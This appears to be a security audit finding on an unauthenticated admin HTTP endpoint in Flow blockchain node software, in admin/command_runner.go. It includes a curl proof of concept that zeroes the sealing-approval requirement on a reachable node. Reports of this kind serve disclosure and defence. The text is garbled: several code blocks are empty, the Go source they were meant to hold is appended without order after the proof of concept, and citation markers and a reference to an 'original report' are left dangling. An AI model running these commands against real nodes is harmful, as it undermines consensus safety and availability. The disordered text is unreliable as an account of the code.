### Title
Unauthenticated Admin HTTP Server Allows Any Network-Reachable Caller to Invoke State-Changing Commands - (File: `admin/command_runner.go`)

### Summary
The Flow node admin HTTP server exposes a `RunCommand` endpoint that accepts any command — including critical state-changing ones — without any authentication or caller-identity check. Any process that can reach the HTTP port can invoke commands such as `set-config` (to zero out `consensus-required-approvals-for-sealing`), `stop-at-height`, or `ingest-tx-rate-limit`, mirroring the original report's pattern of a function documented as operator-only that enforces no such restriction in code.

### Finding Description
`admin/command_runner.go` starts two servers: a gRPC server bound to a Unix socket (local-only) and an HTTP reverse-proxy server bound to the caller-supplied `bindAddress`.

The HTTP server is created with no authentication middleware:

```go
httpServer := &http.Server{
    Addr:      r.httpAddress,
    Handler:   mux,
    TLSConfig: r.tlsConfig,
}
``` [1](#0-0) 

`TLSConfig` is optional and carries no identity verification even when set. The `mux` routes every POST to `/admin/run_command` directly to the gRPC gateway with no interceptor:

```go
mux.Handle("/", gwmux)
``` [2](#0-1) 

`runCommand` — the single dispatch function for all admin commands — performs no caller-identity check before executing the requested handler:

```go

The `adminServer.RunCommand` gRPC handler likewise adds no identity gate:

```go

The `SetConfigCommand` handler — registered for the `set-config` command — directly mutates any registered updatable config field with no further authorization:

```go

``` [5](#0-4) 

The README explicitly documents that `consensus-required-approvals-for-sealing` is a live-updatable field reachable via this endpoint:

```
curl localhost:9002/admin/run_command -d '{"commandName": "set-config",
  "data": {"consensus-required-approvals-for-sealing": 1}}'
``` [6](#0-5) 

The `bindAddress` parameter is set by the node builder and the code imposes no constraint that it must be `127.0.0.1`. Binding to `0.0.0.0` is a supported, documented configuration path.

### Impact Explanation
An attacker who can reach the admin HTTP port can:

1. **Disable sealing approvals**: `set-config {"consensus-required-approvals-for-sealing": 0}` removes the approval requirement for block sealing, allowing a Consensus node to seal blocks without Verification node sign-off — a direct attack on the BFT safety guarantee.
2. **Halt the node**: `stop-at-height` forces the node to stop processing at an attacker-chosen height.
3. **Manipulate rate limiting**: `ingest-tx-rate-limit` can add or remove addresses from the Collection node's rate-limit list, enabling transaction censorship or flooding.
4. **Trigger profiler/checkpoint operations** that degrade node performance.

These are not read-only operations; they mutate live node state with immediate protocol-level effect.

### Likelihood Explanation
The `bindAddress` is operator-configured with no enforced localhost restriction in code. Nodes deployed in containerized or cloud environments (where `0.0.0.0` is common), co-located services, or misconfigured firewalls expose the port to any network-reachable caller. No credential, token, or cryptographic proof is required — a single unauthenticated HTTP POST suffices. A malicious unstaked Access/Observer node sharing network access with a staked node is a realistic attacker.

### Recommendation
Add an authentication layer to the admin HTTP server. Options include:

- **Mutual TLS**: require client certificates signed by a node-operator CA; the existing `tlsConfig` field provides a hook but is not enforced.
- **Bearer token / HMAC**: require a shared secret header validated in an HTTP middleware before the request reaches the gRPC gateway.
- **Enforce localhost-only binding**: reject `bindAddress` values that are not loopback addresses at startup, and document this as a hard requirement.

At minimum, add an HTTP middleware that rejects requests lacking a valid credential before they reach `gwmux`.

### Proof of Concept
Assuming the admin server is bound to `0.0.0.0:9002` (a supported configuration):

```bash
# Step 1: Confirm the endpoint is reachable with no credentials
curl -s http://<node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "list-commands"}'
# Returns the full list of available commands — no auth required.

# Step 2: Zero out the consensus approval requirement
curl -s http://<node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "set-config",
       "data": {"consensus-required-approvals-for-sealing": 0}}'
# Returns {"oldValue": N, "newValue": 0} — change applied immediately.

# Step 3: Verify the change took effect
curl -s http://<node-ip>:9002/admin/run_command \
  -H 'Content-Type: application/json' \
  -d '{"commandName": "get-config",
       "data": "consensus-required-approvals-for-sealing"}'
# Returns 0 — sealing now requires zero approvals.
```

No Flow account, key, stake, or protocol role is required. The attacker is any HTTP client with network reachability to the port.

func (r *CommandRunner) runCommand(ctx context.Context, command string, data any) (any, error) {
	r.logger.Info().Str("command", command).Msg("received new command")

	req := &CommandRequest{Data: data}

	if validator := r.getValidator(command); validator != nil {
		if validationErr := validator(req); validationErr != nil {
			// for expected validation errors, return code InvalidArgument and the error text
			if IsInvalidAdminParameterError(validationErr) {
				return nil, status.Error(codes.InvalidArgument, validationErr.Error())
			}
			// for unexpected errors, return code Internal and log a warning
			r.logger.Err(validationErr).Msg("unexpected error validating admin request")
			return nil, status.Error(codes.Internal, validationErr.Error())
		}
	}

	var handleResult any
	var handleErr error

	if handler := r.getHandler(command); handler != nil {
		if handleResult, handleErr = handler(ctx, req); handleErr != nil {
			if errors.Is(handleErr, context.Canceled) {
				return nil, status.Error(codes.Canceled, "client canceled")
			} else if errors.Is(handleErr, context.DeadlineExceeded) {
				return nil, status.Error(codes.DeadlineExceeded, "request timed out")
			} else {
				r.logger.Err(handleErr).Msg("unexpected error handling admin request")
				s, _ := status.FromError(handleErr)
				return nil, s.Err()
			}
		}
	} else {
		return nil, status.Error(codes.Unimplemented, "invalid command")
	}

	return handleResult, nil
}

	if err != nil {
		return nil, err
	}

	value, err := structpb.NewValue(result)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}

	return &pb.RunCommandResponse{
		Output: value,
	}, nil
}

func (s *SetConfigCommand) Handler(_ context.Context, req *admin.CommandRequest) (any, error) {
	validatedReq := req.ValidatorData.(validatedSetConfigData)

	oldValue := validatedReq.field.Get()

	err := validatedReq.field.Set(validatedReq.value)
	if err != nil {
		if updatable_configs.IsValidationError(err) {
			return nil, fmt.Errorf("config update failed due to invalid input: %w", err)
		}
		return nil, fmt.Errorf("unexpected error setting config field %s: %w", validatedReq.field.Name, err)
	}

	res := map[string]any{
		"oldValue": oldValue,
		"newValue": validatedReq.value,
	}

	return res, nil
}
